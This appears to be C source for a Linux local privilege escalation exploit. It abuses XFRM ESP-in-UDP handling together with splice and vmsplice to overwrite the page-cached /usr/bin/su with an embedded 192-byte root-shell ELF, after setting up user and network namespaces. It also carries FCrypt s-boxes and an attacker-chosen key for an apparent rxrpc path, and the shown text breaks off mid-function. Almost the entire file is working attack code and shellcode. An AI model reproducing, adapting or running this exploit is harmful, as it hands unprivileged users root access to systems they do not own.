#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <sched.h>
#include <poll.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>
#include <linux/rxrpc.h>
#include <linux/keyctl.h>
#include <linux/if_alg.h>
#include <termios.h>

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif
#ifndef SOL_UDP
#define SOL_UDP 17
#endif
#ifndef AF_RXRPC
#define AF_RXRPC 33
#endif
#ifndef PF_RXRPC
#define PF_RXRPC AF_RXRPC
#endif
#ifndef SOL_RXRPC
#define SOL_RXRPC 272
#endif
#ifndef SOL_ALG
#define SOL_ALG 279
#endif
#ifndef AF_ALG
#define AF_ALG 38
#endif
#ifndef MSG_SPLICE_PAGES
#define MSG_SPLICE_PAGES 0x8000000
#endif

#define ENC_PORT         4500
#define SEQ_VAL          200
#define REPLAY_SEQ       100
#define PATCH_OFFSET     0              /* overwrite whole ELF starting at file[0] */
#define PAYLOAD_LEN      192            /* bytes of shell_elf to write (48 triggers) */
#define ENTRY_OFFSET     0x78           /* shellcode entry inside the new ELF */

/* RXRPC constants */
#define RXRPC_PACKET_TYPE_DATA          1
#define RXRPC_PACKET_TYPE_ACK           2
#define RXRPC_PACKET_TYPE_ABORT         4
#define RXRPC_PACKET_TYPE_CHALLENGE     6
#define RXRPC_PACKET_TYPE_RESPONSE      7
#define RXRPC_CLIENT_INITIATED          0x01
#define RXRPC_REQUEST_ACK               0x02
#define RXRPC_LAST_PACKET               0x04
#define RXRPC_CHANNELMASK               3
#define RXRPC_CIDSHIFT                  2

struct rxrpc_wire_header {
    uint32_t epoch;
    uint32_t cid;
    uint32_t callNumber;
    uint32_t seq;
    uint32_t serial;
    uint8_t  type;
    uint8_t  flags;
    uint8_t  userStatus;
    uint8_t  securityIndex;
    uint16_t cksum;
    uint16_t serviceId;
} __attribute__((packed));

struct rxkad_challenge {
    uint32_t version;
    uint32_t nonce;
    uint32_t min_level;
    uint32_t __padding;
} __attribute__((packed));

/* Attacker-chosen 8-byte session key */
static uint8_t SESSION_KEY[8] = {
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08
};

/*
 * 192-byte minimal x86_64 root-shell ELF.
 * _start at 0x400078:
 * setgid(0); setuid(0); setgroups(0, NULL);
 * execve("/bin/sh", NULL, ["TERM=xterm", NULL]);
 */
static const uint8_t shell_elf[PAYLOAD_LEN] = {
    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
    0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
    0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
    0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
    0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
};

/* FCrypt s-boxes */
static const uint8_t fc_sbox0_raw[256] = {
    0xea, 0x7f, 0xb2, 0x64, 0x9d, 0xb0, 0xd9, 0x11, 0xcd, 0x86, 0x86, 0x91, 0x0a, 0xb2, 0x93, 0x06,
    0x0e, 0x06, 0xd2, 0x65, 0x73, 0xc5, 0x28, 0x60, 0xf2, 0x20, 0xb5, 0x38, 0x7e, 0xda, 0x9f, 0xe3,
    0xd2, 0xcf, 0xc4, 0x3c, 0x61, 0xff, 0x4a, 0x4a, 0x35, 0xac, 0xaa, 0x5f, 0x2b, 0xbb, 0xbc, 0x53,
    0x4e, 0x9d, 0x78, 0xa3, 0xdc, 0x09, 0x32, 0x10, 0xc6, 0x6f, 0x66, 0xd6, 0xab, 0xa9, 0xaf, 0xfd,
    0x3b, 0x95, 0xe8, 0x34, 0x9a, 0x81, 0x72, 0x80, 0x9c, 0xf3, 0xec, 0xda, 0x9f, 0x26, 0x76, 0x15,
    0x3e, 0x55, 0x4d, 0xde, 0x84, 0xee, 0xad, 0xc7, 0xf1, 0x6b, 0x3d, 0xd3, 0x04, 0x49, 0xaa, 0x24,
    0x0b, 0x8a, 0x83, 0xba, 0xfa, 0x85, 0xa0, 0xa8, 0xb1, 0xd4, 0x01, 0xd8, 0x70, 0x64, 0xf0, 0x51,
    0xd2, 0xc3, 0xa7, 0x75, 0x8c, 0xa5, 0x64, 0xef, 0x10, 0x4e, 0xb7, 0xc6, 0x61, 0x03, 0xeb, 0x44,
    0x3d, 0xe5, 0xb3, 0x5b, 0xae, 0xd5, 0xad, 0x1d, 0xfa, 0x5a, 0x1e, 0x33, 0xab, 0x93, 0xa2, 0xb7,
    0xe7, 0xa8, 0x45, 0xa4, 0xcd, 0x29, 0x63, 0x44, 0xb6, 0x69, 0x7e, 0x2e, 0x62, 0x03, 0xc8, 0xe0,
    0x17, 0xbb, 0xc7, 0xf3, 0x3f, 0x36, 0xba, 0x71, 0x8e, 0x97, 0x65, 0x60, 0x69, 0xb6, 0xf6, 0xe6,
    0x6e, 0xe0, 0x81, 0x59, 0xe8, 0xaf, 0xdd, 0x95, 0x22, 0x99, 0xfd, 0x63, 0x19, 0x74, 0x61, 0xb1,
    0xb6, 0x5b, 0xae, 0x54, 0xb3, 0x70, 0xff, 0xc6, 0x3b, 0x3e, 0xc1, 0xd7, 0xe1, 0x0e, 0x76, 0xe5,
    0x36, 0x4f, 0x59, 0xc7, 0x08, 0x6e, 0x82, 0xa6, 0x93, 0xc4, 0xaa, 0x26, 0x49, 0xe0, 0x21, 0x64,
    0x07, 0x9f, 0x64, 0x81, 0x9c, 0xbf, 0xf9, 0xd1, 0x43, 0xf8, 0xb6, 0xb9, 0xf1, 0x24, 0x75, 0x03,
    0xe4, 0xb0, 0x99, 0x46, 0x3d, 0xf5, 0xd1, 0x39, 0x72, 0x12, 0xf6, 0xba, 0x0c, 0x0d, 0x42, 0x2e,
};
static const uint8_t fc_sbox1_raw[256] = {
    0x77, 0x14, 0xa6, 0xfe, 0xb2, 0x5e, 0x8c, 0x3e, 0x67, 0x6c, 0xa1, 0x0d, 0xc2, 0xa2, 0xc1, 0x85,
    0x6c, 0x7b, 0x67, 0xc6, 0x23, 0xe3, 0xf2, 0x89, 0x50, 0x9c, 0x03, 0xb7, 0x73, 0xe6, 0xe1, 0x39,
    0x31, 0x2c, 0x27, 0x9f, 0xa5, 0x69, 0x44, 0xd6, 0x23, 0x83, 0x98, 0x7d, 0x3c, 0xb4, 0x2d, 0x99,
    0x1c, 0x1f, 0x8c, 0x20, 0x03, 0x7c, 0x5f, 0xad, 0xf4, 0xfa, 0x95, 0xca, 0x76, 0x44, 0xcd, 0xb6,
    0xb8, 0xa1, 0xa1, 0xbe, 0x9e, 0x54, 0x8f, 0x0b, 0x16, 0x74, 0x31, 0x8a, 0x23, 0x17, 0x04, 0xfa,
    0x79, 0x84, 0xb1, 0xf5, 0x13, 0xab, 0xb5, 0x2e, 0xaa, 0x0c, 0x60, 0x6b, 0x5b, 0xc4, 0x4b, 0xbc,
    0xe2, 0xaf, 0x45, 0x73, 0xfa, 0xc9, 0x49, 0xcd, 0x00, 0x92, 0x7d, 0x97, 0x7a, 0x18, 0x60, 0x3d,
    0xcf, 0x5b, 0xde, 0xc6, 0xe2, 0xe6, 0xbb, 0x8b, 0x06, 0xda, 0x08, 0x15, 0x1b, 0x88, 0x6a, 0x17,
    0x89, 0xd0, 0xa9, 0xc1, 0xc9, 0x70, 0x6b, 0xe5, 0x43, 0xf4, 0x68, 0xc8, 0xd3, 0x84, 0x28, 0x0a,
    0x52, 0x66, 0xa3, 0xca, 0xf2, 0xe3, 0x7f, 0x7a, 0x31, 0xf7, 0x88, 0x94, 0x5e, 0x9c, 0x63, 0xd5,
    0x24, 0x66, 0xfc, 0xb3, 0x57, 0x25, 0xbe, 0x89, 0x44, 0xc4, 0xe0, 0x8f, 0x23, 0x3c, 0x12, 0x52,
    0xf5, 0x1e, 0xf4, 0xcb, 0x18, 0x33, 0x1f, 0xf8, 0x69, 0x10, 0x9d, 0xd3, 0xf7, 0x28, 0xf8, 0x30,
    0x05, 0x5e, 0x32, 0xc0, 0xd5, 0x19, 0xbd, 0x45, 0x8b, 0x5b, 0xfd, 0xbc, 0xe2, 0x5c, 0xa9, 0x96,
    0xef, 0x70, 0xcf, 0xc2, 0x2a, 0xb3, 0x61, 0xad, 0x80, 0x48, 0x81, 0xb7, 0x1d, 0x43, 0xd9, 0xd7,
    0x45, 0xf0, 0xd8, 0x8a, 0x59, 0x7c, 0x57, 0xc1, 0x79, 0xc7, 0x34, 0xd6, 0x43, 0xdf, 0xe4, 0x78,
    0x16, 0x06, 0xda, 0x92, 0x76, 0x51, 0xe1, 0xd4, 0x70, 0x03, 0xe0, 0x2f, 0x96, 0x91, 0x82, 0x80,
};
static const uint8_t fc_sbox2_raw[256] = {
    0xf0, 0x37, 0x24, 0x53, 0x2a, 0x03, 0x83, 0x86, 0xd1, 0xec, 0x50, 0xf0, 0x42, 0x78, 0x2f, 0x6d,
    0xbf, 0x80, 0x87, 0x27, 0x95, 0xe2, 0xc5, 0x5d, 0xf9, 0x6f, 0xdb, 0xb4, 0x65, 0x6e, 0xe7, 0x24,
    0xc8, 0x1a, 0xbb, 0x49, 0xb5, 0x0a, 0x7d, 0xb9, 0xe8, 0xdc, 0xb7, 0xd9, 0x45, 0x20, 0x1b, 0xce,
    0x59, 0x9d, 0x6b, 0xbd, 0x0e, 0x8f, 0xa3, 0xa9, 0xbc, 0x74, 0xa6, 0xf6, 0x7f, 0x5f, 0xb1, 0x68,
    0x84, 0xbc, 0xa9, 0xfd, 0x55, 0x50, 0xe9, 0xb6, 0x13, 0x5e, 0x07, 0xb8, 0x95, 0x02, 0xc0, 0xd0,
    0x6a, 0x1a, 0x85, 0xbd, 0xb6, 0xfd, 0xfe, 0x17, 0x3f, 0x09, 0xa3, 0x8d, 0xfb, 0xed, 0xda, 0x1d,
    0x6d, 0x1c, 0x6c, 0x01, 0x5a, 0xe5, 0x71, 0x3e, 0x8b, 0x6b, 0xbe, 0x29, 0xeb, 0x12, 0x19, 0x34,
    0xcd, 0xb3, 0xbd, 0x35, 0xea, 0x4b, 0xd5, 0xae, 0x2a, 0x79, 0x5a, 0xa5, 0x32, 0x12, 0x7b, 0xdc,
    0x2c, 0xd0, 0x22, 0x4b, 0xb1, 0x85, 0x59, 0x80, 0xc0, 0x30, 0x9f, 0x73, 0xd3, 0x14, 0x48, 0x40,
    0x07, 0x2d, 0x8f, 0x80, 0x0f, 0xce, 0x0b, 0x5e, 0xb7, 0x5e, 0xac, 0x24, 0x94, 0x4a, 0x18, 0x15,
    0x05, 0xe8, 0x02, 0x77, 0xa9, 0xc7, 0x40, 0x45, 0x89, 0xd1, 0xea, 0xde, 0x0c, 0x79, 0x2a, 0x99,
    0x6c, 0x3e, 0x95, 0xdd, 0x8c, 0x7d, 0xad, 0x6f, 0xdc, 0xff, 0xfd, 0x62, 0x47, 0xb3, 0x21, 0x8a,
    0xec, 0x8e, 0x19, 0x18, 0xb4, 0x6e, 0x3d, 0xfd, 0x74, 0x54, 0x1e, 0x04, 0x85, 0xd8, 0xbc, 0x1f,
    0x56, 0xe7, 0x3a, 0x56, 0x67, 0xd6, 0xc8, 0xa5, 0xf3, 0x8e, 0xde, 0xae, 0x37, 0x49, 0xb7, 0xfa,
    0xc8, 0xf4, 0x1f, 0xe0, 0x2a, 0x9b, 0x15, 0xd1, 0x34, 0x0e, 0xb5, 0xe0, 0x44, 0x78, 0x84, 0x59,
    0x56, 0x68, 0x77, 0xa5, 0x14, 0x06, 0xf5, 0x2f, 0x8c, 0x8a, 0x73, 0x80, 0x76, 0xb4, 0x10, 0x86,
};
static const uint8_t fc_sbox3_raw[256] = {
    0xa9, 0x2a, 0x48, 0x51, 0x84, 0x7e, 0x49, 0xe2, 0xb5, 0xb7, 0x42, 0x33, 0x7d, 0x5d, 0xa6, 0x12,
    0x44, 0x48, 0x6d, 0x28, 0xaa, 0x20, 0x6d, 0x57, 0xd6, 0x6b, 0x5d, 0x72, 0xf0, 0x92, 0x5a, 0x1b,
    0x53, 0x80, 0x24, 0x70, 0x9a, 0xcc, 0xa7, 0x66, 0xa1, 0x01, 0xa5, 0x41, 0x97, 0x41, 0x31, 0x82,
    0xf1, 0x14, 0xcf, 0x53, 0x0d, 0xa0, 0x10, 0xcc, 0x2a, 0x7d, 0xd2, 0xbf, 0x4b, 0x1a, 0xdb, 0x16,
    0x47, 0xf6, 0x51, 0x36, 0xed, 0xf3, 0xb9, 0x1a, 0xa7, 0xdf, 0x29, 0x43, 0x01, 0x54, 0x70, 0xa4,
    0xbf, 0xd4, 0x0b, 0x53, 0x44, 0x60, 0x9e, 0x23, 0xa1, 0x18, 0x68, 0x4f, 0xf0, 0x2f, 0x82, 0xc2,
    0x2a, 0x41, 0xb2, 0x42, 0x0c, 0xed, 0x0c, 0x1d, 0x13, 0x3a, 0x3c, 0x6e, 0x35, 0xdc, 0x60, 0x65,
    0x85, 0xe9, 0x64, 0x02, 0x9a, 0x3f, 0x9f, 0x87, 0x96, 0xdf, 0xbe, 0xf2, 0xcb, 0xe5, 0x6c, 0xd4,
    0x5a, 0x83, 0xbf, 0x92, 0x1b, 0x94, 0x00, 0x42, 0xcf, 0x4b, 0x00, 0x75, 0xba, 0x8f, 0x76, 0x5f,
    0x5d, 0x3a, 0x4d, 0x09, 0x12, 0x08, 0x38, 0x95, 0x17, 0xe4, 0x01, 0x1d, 0x4c, 0xa9, 0xcc, 0x85,
    0x82, 0x4c, 0x9d, 0x2f, 0x3b, 0x66, 0xa1, 0x34, 0x10, 0xcd, 0x59, 0x89, 0xa5, 0x31, 0xcf, 0x05,
    0xc8, 0x84, 0xfa, 0xc7, 0xba, 0x4e, 0x8b, 0x1a, 0x19, 0xf1, 0xa1, 0x3b, 0x18, 0x12, 0x17, 0xb0,
    0x98, 0x8d, 0x0b, 0x23, 0xc3, 0x3a, 0x2d, 0x20, 0xdf, 0x13, 0xa0, 0xa8, 0x4c, 0x0d, 0x6c, 0x2f,
    0x47, 0x13, 0x13, 0x52, 0x1f, 0x2d, 0xf5, 0x79, 0x3d, 0xa2, 0x54, 0xbd, 0x69, 0xc8, 0x6b, 0xf3,
    0x05, 0x28, 0xf1, 0x16, 0x46, 0x40, 0xb0, 0x11, 0xd3, 0xb7, 0x95, 0x49, 0xcf, 0xc3, 0x1d, 0x8f,
    0xd8, 0xe1, 0x73, 0xdb, 0xad, 0xc8, 0xc9, 0xa9, 0xa1, 0xc2, 0xc5, 0xe3, 0xba, 0xfc, 0x0e, 0x25,
};

static uint32_t fc_sbox0[256], fc_sbox1[256], fc_sbox2[256], fc_sbox3[256];

/* Global variables */
extern int g_su_verbose;
int g_su_verbose = 0;
static char *g_target_path = NULL;
static int trigger_seq = 0;

#define SLOG(fmt, ...) do { if (g_su_verbose) fprintf(stderr, "[su] " fmt "\n", ##__VA_ARGS__); } while (0)
#define LOG(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define DBG(fmt, ...) fprintf(stderr, "[.] " fmt "\n", ##__VA_ARGS__)

/* Helper functions */
static int write_file(const char *path, const char *fmt, ...)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    char buf[256]; va_list ap; va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    int r = (int)write(fd, buf, n); close(fd);
    return r;
}

static int write_proc(const char *path, const char *buf)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    int n = write(fd, buf, strlen(buf));
    close(fd);
    return n;
}

static void silence_stderr(int *saved_fd)
{
    *saved_fd = dup(STDERR_FILENO);
    int dn = open("/dev/null", O_WRONLY);
    if (dn >= 0) {
        dup2(dn, STDERR_FILENO);
        close(dn);
    }
}

static void restore_stderr(int saved_fd)
{
    if (saved_fd >= 0) {
        dup2(saved_fd, STDERR_FILENO);
        close(saved_fd);
    }
}

static char **append_corrupt_only(int argc, char **argv, int *new_argc)
{
    static char *flag = "--corrupt-only";
    static char *buf[64];
    int n = argc < 60 ? argc : 60;
    for (int i = 0; i < n; i++)
        buf[i] = argv[i];
    buf[n] = flag;
    buf[n + 1] = NULL;
    *new_argc = n + 1;
    return buf;
}

/* ESP/XFRM functions */
static void put_attr(struct nlmsghdr *nlh, int type, const void *data, size_t len)
{
    struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len  = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

static int add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi)
{
    int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (sk < 0) return -1;
    struct sockaddr_nl nl = { .nl_family = AF_NETLINK };
    if (bind(sk, (struct sockaddr*)&nl, sizeof(nl)) < 0) { close(sk); return -1; }

    char buf[4096] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_type  = XFRM_MSG_NEWSA;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_pid   = getpid();
    nlh->nlmsg_seq   = 1;
    nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));

    struct xfrm_usersa_info *xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
    xs->id.daddr.a4 = inet_addr("127.0.0.1");
    xs->id.spi      = htonl(spi);
    xs->id.proto    = IPPROTO_ESP;
    xs->saddr.a4    = inet_addr("127.0.0.1");
    xs->family      = AF_INET;
    xs->mode        = XFRM_MODE_TRANSPORT;
    xs->replay_window = 0;
    xs->reqid       = 0x1234;
    xs->flags       = XFRM_STATE_ESN;
    xs->lft.soft_byte_limit   = (uint64_t)-1;
    xs->lft.hard_byte_limit   = (uint64_t)-1;
    xs->lft.soft_packet_limit = (uint64_t)-1;
    xs->lft.hard_packet_limit = (uint64_t)-1;
    xs->sel.family  = AF_INET;
    xs->sel.prefixlen_d = 32;
    xs->sel.prefixlen_s = 32;
    xs->sel.daddr.a4 = inet_addr("127.0.0.1");
    xs->sel.saddr.a4 = inet_addr("127.0.0.1");

    {
        char alg_buf[sizeof(struct xfrm_algo_auth) + 32];
        memset(alg_buf, 0, sizeof(alg_buf));
        struct xfrm_algo_auth *aa = (struct xfrm_algo_auth *)alg_buf;
        strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name)-1);
        aa->alg_key_len   = 32 * 8;
        aa->alg_trunc_len = 128;
        memset(aa->alg_key, 0xAA, 32);
        put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, alg_buf, sizeof(alg_buf));
    }
    {
        char alg_buf[sizeof(struct xfrm_algo) + 16];
        memset(alg_buf, 0, sizeof(alg_buf));
        struct xfrm_algo *ea = (struct xfrm_algo *)alg_buf;
        strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name)-1);
        ea->alg_key_len = 16 * 8;
        memset(ea->alg_key, 0xBB, 16);
        put_attr(nlh, XFRMA_ALG_CRYPT, alg_buf, sizeof(alg_buf));
    }
    {
        struct xfrm_encap_tmpl enc;
        memset(&enc, 0, sizeof(enc));
        enc.encap_type  = UDP_ENCAP_ESPINUDP;
        enc.encap_sport = htons(ENC_PORT);
        enc.encap_dport = htons(ENC_PORT);
        enc.encap_oa.a4 = 0;
        put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));
    }
    {
        char esn_buf[sizeof(struct xfrm_replay_state_esn) + 4];
        memset(esn_buf, 0, sizeof(esn_buf));
        struct xfrm_replay_state_esn *esn = (struct xfrm_replay_state_esn *)esn_buf;
        esn->bmp_len       = 1;
        esn->oseq          = 0;
        esn->seq           = REPLAY_SEQ;
        esn->oseq_hi       = 0;
        esn->seq_hi        = patch_seqhi;
        esn->replay_window = 32;
        put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn_buf, sizeof(esn_buf));
    }

    if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) { close(sk); return -1; }
    char rbuf[4096];
    int n = recv(sk, rbuf, sizeof(rbuf), 0);
    if (n < 0) { close(sk); return -1; }
    struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;
    if (rh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *e = NLMSG_DATA(rh);
        if (e->error) { close(sk); return -1; }
    }
    close(sk);
    return 0;
}

static int do_one_write(const char *path, off_t offset, uint32_t spi)
{
    int sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_recv < 0) return -1;
    int one = 1;
    setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in sa_d = {
        .sin_family = AF_INET,
        .sin_port   = htons(ENC_PORT),
        .sin_addr   = { inet_addr("127.0.0.1") },
    };
    if (bind(sk_recv, (struct sockaddr*)&sa_d, sizeof(sa_d)) < 0) {
        close(sk_recv); return -1;
    }
    int encap = UDP_ENCAP_ESPINUDP;
    if (setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0) {
        close(sk_recv); return -1;
    }
    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) { close(sk_recv); return -1; }
    if (connect(sk_send, (struct sockaddr*)&sa_d, sizeof(sa_d)) < 0) {
        close(sk_send); close(sk_recv); return -1;
    }
    int file_fd = open(path, O_RDONLY);
    if (file_fd < 0) { close(sk_send); close(sk_recv); return -1; }

    int pfd[2];
    if (pipe(pfd) < 0) { close(file_fd); close(sk_send); close(sk_recv); return -1; }

    uint8_t hdr[24];
    *(uint32_t*)(hdr + 0) = htonl(spi);
    *(uint32_t*)(hdr + 4) = htonl(SEQ_VAL);
    memset(hdr + 8, 0xCC, 16);

    struct iovec iov_h = { .iov_base = hdr, .iov_len = sizeof(hdr) };
    if (vmsplice(pfd[1], &iov_h, 1, 0) != (ssize_t)sizeof(hdr)) {
        close(file_fd); close(pfd[0]); close(pfd[1]); close(sk_send); close(sk_recv); return -1;
    }
    off_t off = offset;
    ssize_t s = splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
    if (s != 16) {
        close(file_fd); close(pfd[0]); close(pfd[1]); close(sk_send); close(sk_recv); return -1;
    }
    s = splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
    usleep(150 * 1000);

    close(file_fd); close(pfd[0]); close(pfd[1]);
    close(sk_send); close(sk_recv);
    return s == 40 ? 0 : -1;
}

static int verify_byte(const char *path, off_t offset, uint8_t want)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    uint8_t got;
    if (pread(fd, &got, 1, offset) != 1) { close(fd); return -1; }
    close(fd);
    return got == want ? 0 : -1;
}

static void setup_userns_netns(void)
{
    uid_t real_uid = getuid();
    gid_t real_gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        SLOG("unshare: %s", strerror(errno));
        exit(1);
    }
    write_proc("/proc/self/setgroups", "deny");
    char map[64];
    snprintf(map, sizeof(map), "0 %u 1", real_uid);
    if (write_proc("/proc/self/uid_map", map) < 0) {
        SLOG("uid_map: %s", strerror(errno)); exit(1);
    }
    snprintf(map, sizeof(map), "0 %u 1", real_gid);
    if (write_proc("/proc/self/gid_map", map) < 0) {
        SLOG("gid_map: %s", strerror(errno)); exit(1);
    }
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) { SLOG("socket: %s", strerror(errno)); exit(1); }
    struct ifreq ifr; memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
    if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) { SLOG("SIOCGIFFLAGS: %s", strerror(errno)); exit(1); }
    ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
    if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) { SLOG("SIOCSIFFLAGS: %s", strerror(errno)); exit(1); }
    close(s);
}

static int corrupt_su(const char *target_path)
{
    setup_userns_netns();
    usleep(100 * 1000);

    for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
        uint32_t spi = 0xDEADBE10 + i;
        uint32_t seqhi =
            ((uint32_t)shell_elf[i*4 + 0] << 24) |
            ((uint32_t)shell_elf[i*4 + 1] << 16) |
            ((uint32_t)shell_elf[i*4 + 2] <<  8) |
            ((uint32_t)shell_elf[i*4 + 3]);
        if (add_xfrm_sa(spi, seqhi) < 0) {
            SLOG("add_xfrm_sa #%d failed", i);
            return -1;
        }
    }
    SLOG("installed %d xfrm SAs", PAYLOAD_LEN / 4);

    for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
        uint32_t spi = 0xDEADBE10 + i;
        off_t off = PATCH_OFFSET + i * 4;
        if (do_one_write(target_path, off, spi) < 0) {
            SLOG("do_one_write #%d at off=0x%lx failed", i, (long)off);
            return -1;
        }
    }
    SLOG("wrote %d bytes to %s starting at 0x%x",
            PAYLOAD_LEN, target_path, PATCH_OFFSET);
    return 0;
}

int su_lpe_main(int argc, char **argv, const char *target_path)
{
    if (!target_path) {
        target_path = "/usr/bin/su";
    }
    
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-v") || !strcmp(argv[i], "--verbose"))
            g_su_verbose = 1;
        else if (!strcmp(argv[i], "--corrupt-only"))
            ;
    }
    if (getenv("DIRTYFRAG_VERBOSE")) g_su_verbose = 1;

    pid_t cpid = fork();
    if (cpid < 0) return 1;
    if (cpid == 0) {
        int rc = corrupt_su(target_path);
        _exit(rc == 0 ? 0 : 2);
    }
    int cstatus;
    waitpid(cpid, &cstatus, 0);
    if (!WIFEXITED(cstatus) || WEXITSTATUS(cstatus) != 0) {
        SLOG("corruption stage failed (status=0x%x)", cstatus);
        return 1;
    }

    if (verify_byte(target_path, ENTRY_OFFSET, 0x31) != 0 ||
            verify_byte(target_path, ENTRY_OFFSET + 1, 0xff) != 0) {
        SLOG("post-write verify failed (target unchanged)");
        return 1;
    }
    SLOG("%s page-cache patched (entry 0x%x = shellcode)",
            target_path, ENTRY_OFFSET);
    return 0;
}

/* FCrypt functions */
#include <endian.h>

static void fcrypt_init_sboxes(void)
{
    for (int i = 0; i < 256; i++) {
        fc_sbox0[i] = htobe32((uint32_t)fc_sbox0_raw[i] << 3);
        fc_sbox1[i] = htobe32(((uint32_t)(fc_sbox1_raw[i] & 0x1f) << 27) |
                ((uint32_t)fc_sbox1_raw[i] >> 5));
        fc_sbox2[i] = htobe32((uint32_t)fc_sbox2_raw[i] << 11);
        fc_sbox3[i] = htobe32((uint32_t)fc_sbox3_raw[i] << 19);
    }
}

#define fc_ror56_64(k, n) \
    (k = (k >> (n)) | ((k & ((1ULL << (n)) - 1)) << (56 - (n))))

typedef struct { uint32_t sched[16]; } fcrypt_uctx;

static void fcrypt_user_setkey(fcrypt_uctx *ctx, const uint8_t key[8])
{
    uint64_t k = 0;
    k  = (uint64_t)(key[0] >> 1);
    k <<= 7; k |= (uint64_t)(key[1] >> 1);
    k <<= 7; k |= (uint64_t)(key[2] >> 1);
    k <<= 7; k |= (uint64_t)(key[3] >> 1);
    k <<= 7; k |= (uint64_t)(key[4] >> 1);
    k <<= 7; k |= (uint64_t)(key[5] >> 1);
    k <<= 7; k |= (uint64_t)(key[6] >> 1);
    k <<= 7; k |= (uint64_t)(key[7] >> 1);

    ctx->sched[0x0] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
    ctx->sched[0x1] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
    ctx->sched[0x2] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
    ctx->sched[0x3] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
    ctx->sched[0x4] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
